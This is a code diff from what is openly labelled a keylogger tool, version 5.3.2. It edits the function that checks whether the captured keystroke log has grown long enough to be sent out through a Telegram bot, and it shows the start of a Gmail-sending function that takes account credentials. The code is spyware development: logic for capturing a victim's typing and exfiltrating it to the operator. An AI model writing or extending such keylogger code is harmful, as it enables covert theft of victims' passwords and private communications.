@@ -8,7 +8,7 @@
 # ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
 # ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
-# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗                 v5.3.1
+# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗                 v5.3.2
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║           by SebastianEPH
 # ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝   https://github.com/SebastianEPH|
 
@@ -116,16 +116,16 @@ class Functions:
             regk = open(Config().PATH_LOG, 'r')
             LEN_TEXT = len(regk.read())
             print("[LenghtText] Se encontró el Archivo " + Config().LOG_NAME + " correctamente")
-            if LEN_TEXT > Config.TelegramBot().LEN_TEXT:
-                print("[LenghtText] La cantidad de caracteres es superior a: " + str(LEN_TEXT))
+            if LEN_TEXT >= Config.TelegramBot().LEN_TEXT:
+                print("[LenghtText] El Registro tiene " + str(LEN_TEXT) + " caracteres y es superior a " + str(Config.TelegramBot().LEN_TEXT))
                 regk.close()
                 return True
             else:
-                print("[LenghtText] La cantidad de caracteres es es inferior a: " + str(LEN_TEXT))
+                print("[LenghtText] El Registro tiene " + str(LEN_TEXT) + " caracteres y es inferior de " + str(Config.TelegramBot().LEN_TEXT))
                 regk.close()
                 return False
         except:
-            print("[LenghtText] No se encontró el Archivo " + Config().LOG_NAME)
+            print("[LenghtText] No se encontró el Archivo: " + Config().PATH_KEY)
             return False
     def SendGmail(self, file, email, password, receiver_email):
         try:
